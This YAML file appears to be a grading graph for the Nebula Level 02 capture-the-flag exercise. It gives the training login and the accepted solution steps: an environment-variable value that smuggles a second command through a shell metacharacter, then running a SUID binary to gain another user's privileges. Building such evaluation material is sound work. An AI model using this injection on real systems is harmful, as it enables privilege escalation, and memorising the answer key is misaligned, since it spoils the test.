version: '0.5'
graph:
  type: reference
challenge:
  id: nebula_level02
  name: Nebula Level 02
  description: Exploit shell metacharacter injection through the USER environment variable in a SUID program.
attacker_context:
  user: level02
  access:
    method: ssh
    credentials:
      username: level02
      password: level02
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node1
irrelevant_commands:
- man
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- ls
- cd
- cat
- file
- strings
- ltrace
- strace
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: USER payload prepared
- id: node1
  type: state
  label: Execution as flag02 obtained
edges:
- id: edge0
  from: start
  to: node0
  action: set_user_environment_payload
  accepted_commands:
  - 'export USER=''foo; /bin/getflag; #'''
  - export USER='foo;/bin/getflag'
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge1
  from: node0
  to: node1
  action: execute_flag02_binary
  accepted_commands:
  - /home/flag02/flag02
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
